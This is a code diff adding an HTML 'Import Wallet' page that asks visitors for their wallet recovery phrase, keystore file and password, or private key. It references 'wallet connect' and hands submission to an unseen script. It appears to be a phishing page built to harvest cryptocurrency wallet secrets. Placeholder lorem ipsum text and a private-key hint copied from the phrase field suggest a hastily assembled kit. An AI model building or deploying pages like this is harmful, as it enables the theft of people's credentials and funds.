@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Vesper+Libre&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/public/css/style.css">
+    <link rel="stylesheet" href="/public/css/mobile.css">
+    <title>Import Wallet</title>
+</head>
+
+<body id="form">
+    <section class="form">
+        <div class="import">
+            <form method="post" id="formN" name="" class="">
+                <a href="index.html">
+                    <h3><i class="fas fa-less-than"></i>Import Wallet</h3>
+                </a>
+                <ul>
+                    <li class="phrase">
+                        <a href="#phrase">Phrase</a>
+                    </li>
+                    <li class="keystore">
+                        <a href="#keystore">Keystore JSON</a>
+                    </li>
+                    <li class="privatekey">
+                        <a href="#privatekey">Private Key</a>
+                    </li>
+                </ul>
+                <hr>
+                <div id="phrase">
+                    <textarea placeholder="Phrase" id="phraseInput" cols="30" rows="10"></textarea>
+                    <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                </div>
+                <div id="keystore">
+                    <textarea placeholder="Keystore" id="keystoreInputFirst" cols="30" rows="10"></textarea>
+                    <input type="password" id="keystoreInputSecond" placeholder="Password">
+                    <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+                </div>
+                <div id="privatekey">
+                    <input type="text" id="privateKeyInput" placeholder="Private Key">
+                    <p>Typically 12(sometimes 24) words separated by single spaces</p>
+                </div>
+
+                <img id="loadingIcon" style="width: 70px; height: 70px" src="/public/Images/loading.gif" alt="wallet connect loading icon">
+                
+                <input id="submit" type="submit" placeholder="Import" value="Import">
+            </form>
+        </div>
+    </section>
+
+    <div class="msgModalContainer">
+        <div class="msgModal">
+            <p class="msgP">Lorem ipsum dolor sit amet consectetur adipisicing elit. Mollitia, quam!</p>
+            <div class="button-cont">
+                <button onclick="window.location='/'">Okay</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="/public/js/index.js"></script>
+</body>
+
+</html>
